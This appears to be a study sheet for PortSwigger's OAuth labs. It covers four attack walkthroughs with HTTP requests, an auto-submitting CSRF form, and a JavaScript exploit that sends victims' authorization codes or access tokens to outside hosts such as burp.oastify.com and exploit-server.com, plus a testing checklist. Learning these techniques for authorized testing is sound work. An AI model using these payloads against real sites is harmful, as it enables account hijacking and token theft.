# OAuth Authentication - Stage 2

## 🎯 Target Location

**Primary Target:** Sign-in page with OAuth integration

**Key Request:** `/auth?client_id=...`

## 🔥 Attack Techniques

### Lab 1: Authentication Bypass via Implicit Flow
**Bypass:** Modify email/username in POST request

**Scenario:** OAuth callback sends user info to application

**Attack Flow:**
1. Intercept OAuth authentication process
2. Find `/authenticate` POST request
3. Observe parameters: `email`, `username`
4. Change to victim's credentials

**Request:**
```http
POST /authenticate HTTP/1.1
Content-Type: application/json

{
  "email": "carlos@victim.com",
  "username": "carlos"
}
```

---

### Lab 2: Forced OAuth Profile Linking
**Bypass:** CSRF on OAuth linking (missing `state` parameter)

**Attack Flow:**
1. Start OAuth linking process for your account
2. Intercept `/oauth-linking?code=abc123` request
3. Notice missing `state` parameter (CSRF protection)
4. Generate CSRF PoC with this request
5. Drop the request (don't complete linking)
6. Send CSRF PoC to victim
7. Victim links their OAuth to your account
8. Login via OAuth to access victim's account

**CSRF PoC:**
```html
<form method="GET" action="https://vulnerable-site.com/oauth-linking">
  <input type="hidden" name="code" value="YOUR-CODE">
</form>
<script>document.forms[0].submit();</script>
```

---

### Lab 3: Account Hijacking via redirect_uri
**Bypass:** Manipulate `redirect_uri` to steal authorization code

**Attack Flow:**
1. Intercept OAuth authorization request:
```http
GET /auth?client_id=xxx&redirect_uri=https://vulnerable-site.com/oauth-callback&response_type=code&scope=openid HTTP/1.1
```

2. Change `redirect_uri` to your server:
```http
GET /auth?client_id=xxx&redirect_uri=https://burp.oastify.com&response_type=code&scope=openid HTTP/1.1
```

3. Generate CSRF PoC
4. Drop the request
5. Send to victim
6. Check Burp Collaborator for victim's authorization code
7. Use code to authenticate as victim

---

### Lab 4: Stealing Access Tokens via Open Redirect
**Bypass:** Combine open redirect with OAuth to steal tokens

**Attack Flow:**

**Step 1:** Find open redirect (e.g., "Next post" button)
```
/post/next?path=https://evil.com
```

**Step 2:** Chain with OAuth redirect_uri
```
/auth?client_id=xxx&redirect_uri=https://vulnerable-site.com/oauth-callback/../../post/next?path=https://exploit-server.com/&response_type=token&scope=openid
```

**Step 3:** Create exploit to extract fragment identifier
```html
<script>
if (!document.location.hash) {
  window.location = "https://oauth-server.com/auth?client_id=xxx&redirect_uri=https://vulnerable-site.com/oauth-callback/../../post/next?path=https://exploit-server.com/&response_type=token&nonce=123&scope=openid%20profile%20email"
} else {
  window.location = '/?'+document.location.hash.substr(1)
}
</script>
```

**Step 4:** Check exploit server logs for access token

---

## 🔍 OAuth Flow Analysis

### Authorization Code Flow
```
1. User → /auth?client_id=xxx&redirect_uri=xxx&response_type=code
2. OAuth Server → redirect_uri?code=abc123
3. App → /token (exchange code for access token)
4. App → /userinfo (get user data with access token)
```

**Attack Points:**
- Missing `state` parameter → CSRF
- Unvalidated `redirect_uri` → Code/token theft
- Weak `client_secret` → Token forge

### Implicit Flow
```
1. User → /auth?client_id=xxx&redirect_uri=xxx&response_type=token
2. OAuth Server → redirect_uri#access_token=xyz789
3. App → /userinfo (get user data with access token)
```

**Attack Points:**
- Token in URL fragment → XSS can steal
- No server-side validation → Token manipulation
- Unvalidated `redirect_uri` → Token theft

## 🎓 Exam Tips

1. **Look for OAuth sign-in** - "Login with..." buttons
2. **Intercept entire OAuth flow** - Multiple requests involved
3. **Check for `state` parameter** - Missing = CSRF vulnerability
4. **Test `redirect_uri` validation** - Try your server
5. **Look for open redirects** - Can chain with OAuth
6. **Modify `/authenticate` request** - Change email/username
7. **Use Burp Collaborator** - Catch redirected codes/tokens

## 🔍 Testing Checklist

- [ ] Identify OAuth authentication
- [ ] Intercept full OAuth flow
- [ ] Check if `state` parameter exists
- [ ] Test `redirect_uri` manipulation
- [ ] Look for open redirect vulnerabilities
- [ ] Try modifying `/authenticate` POST data
- [ ] Test for CSRF on OAuth linking
- [ ] Check if `client_secret` is exposed

## 📚 Common Parameters

| Parameter | Description | Attack Vector |
|-----------|-------------|---------------|
| `client_id` | Application identifier | Usually fixed |
| `redirect_uri` | Callback URL | Manipulate to steal code/token |
| `response_type` | `code` or `token` | Determines flow type |
| `scope` | Permissions requested | May reveal functionality |
| `state` | CSRF protection | Missing = CSRF vulnerability |
| `code` | Authorization code | Steal via redirect_uri |
| `access_token` | Access token | Steal via redirect_uri or XSS |

## 📚 References

- [PortSwigger OAuth Authentication](https://portswigger.net/web-security/oauth)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
